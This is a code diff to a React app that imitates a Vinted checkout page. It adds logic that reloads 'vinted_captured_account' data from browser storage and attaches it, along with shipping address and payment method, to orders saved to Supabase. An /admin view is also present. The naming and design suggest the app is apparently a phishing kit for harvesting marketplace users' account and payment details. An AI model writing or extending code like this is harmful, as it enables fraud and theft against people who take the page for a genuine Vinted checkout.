@@ -55,7 +55,14 @@ const getInitialView = (): ViewMode => {
 export default function App() {
   // Page Routing State - active /admin url support
   const [currentView, setCurrentView] = useState<ViewMode>(getInitialView);
-  const [accountDetails, setAccountDetails] = useState<UserAccountDetails | null>(null);
+  const [accountDetails, setAccountDetails] = useState<UserAccountDetails | null>(() => {
+    try {
+      const saved = localStorage.getItem('vinted_captured_account') || sessionStorage.getItem('vinted_captured_account');
+      return saved ? JSON.parse(saved) : null;
+    } catch {
+      return null;
+    }
+  });
 
   // Sync with browser URL changes and history
   React.useEffect(() => {
@@ -238,13 +245,24 @@ export default function App() {
     setIsProcessingPayment(true);
     const generatedOrderNum = `VIN-${Math.floor(100000 + Math.random() * 900000)}`;
 
+    // Ensure account details are never lost
+    let activeAccount = accountDetails;
+    if (!activeAccount) {
+      try {
+        const saved = localStorage.getItem('vinted_captured_account') || sessionStorage.getItem('vinted_captured_account');
+        if (saved) activeAccount = JSON.parse(saved);
+      } catch {
+        // Safe
+      }
+    }
+
     try {
       // 1. Direct persistence to Supabase if configured in Netlify
       await saveOrderToSupabase({
         orderNumber: generatedOrderNum,
         productTitle: product.title,
         deliveryType,
-        accountDetails: accountDetails || undefined,
+        accountDetails: activeAccount || undefined,
         pickupPoint: selectedPickupPoint,
         shippingAddress: selectedAddress,
         paymentMethod: selectedPayment,
@@ -260,7 +278,7 @@ export default function App() {
           productId: product.id,
           productTitle: product.title,
           deliveryType,
-          accountDetails: accountDetails || undefined,
+          accountDetails: activeAccount || undefined,
           pickupPoint: selectedPickupPoint,
           shippingAddress: selectedAddress,
           paymentMethod: selectedPayment,
